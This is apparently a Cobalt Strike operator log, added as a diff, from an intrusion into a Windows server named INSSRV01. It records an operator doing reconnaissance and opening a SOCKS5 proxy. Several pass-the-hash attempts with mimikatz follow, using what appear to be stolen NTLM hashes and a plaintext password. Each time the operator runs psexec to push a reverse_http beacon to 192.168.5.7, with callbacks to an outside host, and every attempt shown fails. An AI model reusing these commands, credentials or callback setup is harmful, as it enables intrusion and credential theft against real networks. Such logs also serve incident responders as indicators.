@@ -1,0 +1,148 @@
+02/05 01:55:21 UTC [metadata] 112.199.110.98 <- 192.168.5.15; computer: INSSRV01; user: SYSTEM *; process: rundll32.exe; pid: 800; os: Windows; version: 5.2; build: 3790; beacon arch: x86
+02/05 01:55:12 UTC [task] <T1029> Tasked beacon to become interactive
+02/05 01:55:50 UTC [input] <karson> shell systeminfo
+02/05 01:55:50 UTC [task] <T1059> Tasked beacon to run: systeminfo
+02/05 01:56:11 UTC [checkin] host called home, sent: 57 bytes
+02/05 01:56:47 UTC [input] <karson> sleep 5
+02/05 01:56:47 UTC [task] <T1029> Tasked beacon to sleep for 5s
+02/05 01:56:47 UTC [checkin] host called home, sent: 16 bytes
+02/05 01:56:52 UTC [input] <karson> shell systeminfo
+02/05 01:56:52 UTC [task] <T1059> Tasked beacon to run: systeminfo
+02/05 01:56:52 UTC [checkin] host called home, sent: 41 bytes
+02/05 02:00:15 UTC [input] <karson> socks 48123 SOCKS5 enableNoAuth "karson" "karsonwudi666" disableLogging
+02/05 02:00:15 UTC [output]
+started SOCKS5 server on: 48123
+
+02/05 02:00:20 UTC [checkin] host called home, sent: 16 bytes
+02/05 02:03:11 UTC [output]
+9=========== SharpListRDP（RDP记录查询） ==========
+
+02/05 02:03:11 UTC [task] <T1093> Tasked beacon to run .NET program: LRC.exe
+02/05 02:03:12 UTC [checkin] host called home, sent: 109099 bytes
+02/05 02:04:05 UTC [input] <karson> rev2self
+02/05 02:04:05 UTC [task] <T1134> Tasked beacon to revert token
+02/05 02:04:05 UTC [input] <karson> pth INSSRV01\devadmin 91fb7ac0f77462f37133c60d911b87c4
+02/05 02:04:05 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:devadmin /domain:INSSRV01 /ntlm:91fb7ac0f77462f37133c60d911b87c4 /run:"%COMSPEC% /c echo d9b2811b0d0 > \\.\pipe\c44220" command
+02/05 02:04:05 UTC [checkin] host called home, sent: 31 bytes
+02/05 02:04:06 UTC [input] <karson> jump psexec 192.168.5.7 2008
+02/05 02:04:06 UTC [checkin] host called home, sent: 253559 bytes
+02/05 02:04:06 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.7 via Service Control Manager (\\192.168.5.7\ADMIN$\6e00220.exe)
+02/05 02:04:06 UTC [indicator] service: \\192.168.5.7 6e00220
+02/05 02:04:06 UTC [indicator] file: 581478da54c9361411ea59a604436229 291840 bytes \\192.168.5.7\ADMIN$\6e00220.exe
+02/05 02:04:31 UTC [error] Could not connect to pipe: 2 - ERROR_FILE_NOT_FOUND
+02/05 02:04:31 UTC [error] Failed to open token
+02/05 02:04:32 UTC [checkin] host called home, sent: 293865 bytes
+02/05 02:04:32 UTC [error] could not upload file: 5 - ERROR_ACCESS_DENIED
+02/05 02:04:32 UTC [error] Could not open service control manager on 192.168.5.7: 5
+02/05 02:04:51 UTC [input] <karson> rev2self
+02/05 02:04:51 UTC [task] <T1134> Tasked beacon to revert token
+02/05 02:04:51 UTC [input] <karson> pth INSSRV01\IUSR_INSSRV01 b0ab848d889f5d4e466bcf8d28da115f
+02/05 02:04:51 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:IUSR_INSSRV01 /domain:INSSRV01 /ntlm:b0ab848d889f5d4e466bcf8d28da115f /run:"%COMSPEC% /c echo d4b34e25f96 > \\.\pipe\cc2a3a" command
+02/05 02:04:52 UTC [input] <karson> jump psexec 192.168.5.7 2008
+02/05 02:04:52 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.7 via Service Control Manager (\\192.168.5.7\ADMIN$\d8492c8.exe)
+02/05 02:04:52 UTC [indicator] service: \\192.168.5.7 d8492c8
+02/05 02:04:52 UTC [indicator] file: 8edfe923f6cf087bdcebd1b6bb2b4f44 291840 bytes \\192.168.5.7\ADMIN$\d8492c8.exe
+02/05 02:04:54 UTC [checkin] host called home, sent: 547455 bytes
+02/05 02:05:20 UTC [error] Could not connect to pipe: 2 - ERROR_FILE_NOT_FOUND
+02/05 02:05:20 UTC [error] Failed to open token
+02/05 02:05:20 UTC [error] could not upload file: 5 - ERROR_ACCESS_DENIED
+02/05 02:05:20 UTC [error] Could not open service control manager on 192.168.5.7: 5
+02/05 02:05:35 UTC [input] <karson> rev2self
+02/05 02:05:35 UTC [task] <T1134> Tasked beacon to revert token
+02/05 02:05:35 UTC [input] <karson> pth INSSRV01\jong c398cbc80d8022ab303a4d1ad1fc6729
+02/05 02:05:35 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:jong /domain:INSSRV01 /ntlm:c398cbc80d8022ab303a4d1ad1fc6729 /run:"%COMSPEC% /c echo bbf8b0dbf13 > \\.\pipe\6c04de" command
+02/05 02:05:35 UTC [checkin] host called home, sent: 31 bytes
+02/05 02:05:36 UTC [input] <karson> jump psexec 192.168.5.7 2008
+02/05 02:05:36 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.7 via Service Control Manager (\\192.168.5.7\ADMIN$\b8574a4.exe)
+02/05 02:05:36 UTC [indicator] service: \\192.168.5.7 b8574a4
+02/05 02:05:36 UTC [indicator] file: a534850418a4f2807a44dadf0f4c4ff4 291840 bytes \\192.168.5.7\ADMIN$\b8574a4.exe
+02/05 02:05:38 UTC [checkin] host called home, sent: 547424 bytes
+02/05 02:06:04 UTC [error] Could not connect to pipe: 2 - ERROR_FILE_NOT_FOUND
+02/05 02:06:04 UTC [error] Failed to open token
+02/05 02:06:04 UTC [error] could not upload file: 5 - ERROR_ACCESS_DENIED
+02/05 02:06:04 UTC [error] Could not open service control manager on 192.168.5.7: 5
+02/05 02:06:18 UTC [input] <karson> rev2self
+02/05 02:06:18 UTC [task] <T1134> Tasked beacon to revert token
+02/05 02:06:18 UTC [input] <karson> pth INSSRV01\IWAM_INSSRV01 dcdec748e920d3af865b9a7c927267d5
+02/05 02:06:18 UTC [checkin] host called home, sent: 31 bytes
+02/05 02:06:18 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:IWAM_INSSRV01 /domain:INSSRV01 /ntlm:dcdec748e920d3af865b9a7c927267d5 /run:"%COMSPEC% /c echo 44be83a88cd > \\.\pipe\49e9ab" command
+02/05 02:06:19 UTC [input] <karson> jump psexec 192.168.5.7 2008
+02/05 02:06:19 UTC [checkin] host called home, sent: 253559 bytes
+02/05 02:06:19 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.7 via Service Control Manager (\\192.168.5.7\ADMIN$\d4737ac.exe)
+02/05 02:06:19 UTC [indicator] service: \\192.168.5.7 d4737ac
+02/05 02:06:19 UTC [indicator] file: 9fa7cfe1a36e59119cca0e1e805677e9 291840 bytes \\192.168.5.7\ADMIN$\d4737ac.exe
+02/05 02:06:44 UTC [error] Could not connect to pipe: 2 - ERROR_FILE_NOT_FOUND
+02/05 02:06:44 UTC [error] Failed to open token
+02/05 02:06:44 UTC [checkin] host called home, sent: 293865 bytes
+02/05 02:06:45 UTC [error] could not upload file: 5 - ERROR_ACCESS_DENIED
+02/05 02:06:45 UTC [error] Could not open service control manager on 192.168.5.7: 5
+02/05 02:07:09 UTC [input] <karson> rev2self
+02/05 02:07:09 UTC [task] <T1134> Tasked beacon to revert token
+02/05 02:07:09 UTC [input] <karson> make_token INSSRV01\IUSR_INSSRV01 7aDh\u~7r'g%ZQ
+02/05 02:07:09 UTC [task] <T1134> Tasked beacon to create a token for INSSRV01\IUSR_INSSRV01
+02/05 02:07:09 UTC [input] <karson> jump psexec 192.168.5.7 2008
+02/05 02:07:09 UTC [checkin] host called home, sent: 63 bytes
+02/05 02:07:09 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+02/05 02:07:10 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.7 via Service Control Manager (\\192.168.5.7\ADMIN$\99b0262.exe)
+02/05 02:07:10 UTC [indicator] service: \\192.168.5.7 99b0262
+02/05 02:07:10 UTC [indicator] file: 27eff1fc6a5c62ff9b201afd10c73a4b 291840 bytes \\192.168.5.7\ADMIN$\99b0262.exe
+02/05 02:07:10 UTC [checkin] host called home, sent: 293865 bytes
+02/05 02:07:11 UTC [error] could not upload file: 5 - ERROR_ACCESS_DENIED
+02/05 02:07:11 UTC [error] Could not open service control manager on 192.168.5.7: 5
+02/05 02:11:05 UTC [input] <karson> rev2self
+02/05 02:11:05 UTC [task] <T1134> Tasked beacon to revert token
+02/05 02:11:05 UTC [input] <karson> pth INSSRV01\ramel 0694eca09e067b0d3b31d6f1c7c9316c
+02/05 02:11:05 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:ramel /domain:INSSRV01 /ntlm:0694eca09e067b0d3b31d6f1c7c9316c /run:"%COMSPEC% /c echo c09f115fc4a > \\.\pipe\9cda5b" command
+02/05 02:11:05 UTC [checkin] host called home, sent: 31 bytes
+02/05 02:11:07 UTC [input] <karson> jump psexec 192.168.5.7 2008
+02/05 02:11:07 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.7 via Service Control Manager (\\192.168.5.7\ADMIN$\51af3bf.exe)
+02/05 02:11:07 UTC [indicator] service: \\192.168.5.7 51af3bf
+02/05 02:11:07 UTC [indicator] file: bca9b3d827e6f674fbb948a9c5fb3a6f 291840 bytes \\192.168.5.7\ADMIN$\51af3bf.exe
+02/05 02:11:07 UTC [checkin] host called home, sent: 253559 bytes
+02/05 02:11:32 UTC [error] Could not connect to pipe: 2 - ERROR_FILE_NOT_FOUND
+02/05 02:11:32 UTC [error] Failed to open token
+02/05 02:11:32 UTC [checkin] host called home, sent: 293865 bytes
+02/05 02:11:33 UTC [error] could not upload file: 5 - ERROR_ACCESS_DENIED
+02/05 02:11:33 UTC [error] Could not open service control manager on 192.168.5.7: 5
+02/05 02:13:20 UTC [input] <karson> shell ipconfig
+02/05 02:13:20 UTC [task] <T1059> Tasked beacon to run: ipconfig
+02/05 02:13:20 UTC [checkin] host called home, sent: 39 bytes
+02/05 02:14:06 UTC [input] <karson> sleep 5
+02/05 02:14:06 UTC [task] <T1029> Tasked beacon to sleep for 5s
+02/05 02:14:06 UTC [checkin] host called home, sent: 16 bytes
+02/05 02:14:09 UTC [input] <karson> shell ipconfig
+02/05 02:14:09 UTC [task] <T1059> Tasked beacon to run: ipconfig
+02/05 02:14:11 UTC [checkin] host called home, sent: 39 bytes
+02/05 02:14:43 UTC [output]
+9=========== ipconfig /all ==========
+
+02/05 02:14:43 UTC [task] <T1059> Tasked beacon to run: ipconfig /all
+02/05 02:14:46 UTC [checkin] host called home, sent: 44 bytes
+02/05 02:19:23 UTC [input] <karson> rev2self
+02/05 02:19:23 UTC [task] <T1134> Tasked beacon to revert token
+02/05 02:19:23 UTC [input] <karson> pth INSSRV01\admin a394dc6a6008a0facef91b89d72306ef
+02/05 02:19:23 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:admin /domain:INSSRV01 /ntlm:a394dc6a6008a0facef91b89d72306ef /run:"%COMSPEC% /c echo e371bc3baa3 > \\.\pipe\9d278b" command
+02/05 02:19:24 UTC [input] <karson> jump psexec 192.168.5.7 2008
+02/05 02:19:24 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.7 via Service Control Manager (\\192.168.5.7\ADMIN$\824e399.exe)
+02/05 02:19:24 UTC [indicator] service: \\192.168.5.7 824e399
+02/05 02:19:24 UTC [indicator] file: 42a0e8db28dbc3950a9ae6617cdab72d 291840 bytes \\192.168.5.7\ADMIN$\824e399.exe
+02/05 02:19:27 UTC [checkin] host called home, sent: 547455 bytes
+02/05 02:19:53 UTC [error] Could not connect to pipe: 2 - ERROR_FILE_NOT_FOUND
+02/05 02:19:53 UTC [error] Failed to open token
+02/05 02:19:53 UTC [error] could not upload file: 5 - ERROR_ACCESS_DENIED
+02/05 02:19:53 UTC [error] Could not open service control manager on 192.168.5.7: 5
+02/05 02:21:00 UTC [input] <karson> rev2self
+02/05 02:21:00 UTC [task] <T1134> Tasked beacon to revert token
+02/05 02:21:00 UTC [input] <karson> pth INSSRV01\SUPPORT_388945a0 e4c5aacca9701a59a2758253a6a25a65
+02/05 02:21:00 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:SUPPORT_388945a0 /domain:INSSRV01 /ntlm:e4c5aacca9701a59a2758253a6a25a65 /run:"%COMSPEC% /c echo 771359a75a7 > \\.\pipe\5d1042" command
+02/05 02:21:01 UTC [input] <karson> jump psexec 192.168.5.7 2008
+02/05 02:21:01 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.7 via Service Control Manager (\\192.168.5.7\ADMIN$\871b3d6.exe)
+02/05 02:21:01 UTC [indicator] service: \\192.168.5.7 871b3d6
+02/05 02:21:01 UTC [indicator] file: 2496c4e8224f311aa3c98c04aa96d64a 291840 bytes \\192.168.5.7\ADMIN$\871b3d6.exe
+02/05 02:21:04 UTC [checkin] host called home, sent: 547455 bytes
+02/05 02:21:31 UTC [error] Could not connect to pipe: 2 - ERROR_FILE_NOT_FOUND
+02/05 02:21:31 UTC [error] Failed to open token
+02/05 02:21:31 UTC [error] could not upload file: 5 - ERROR_ACCESS_DENIED
+02/05 02:21:31 UTC [error] Could not open service control manager on 192.168.5.7: 5
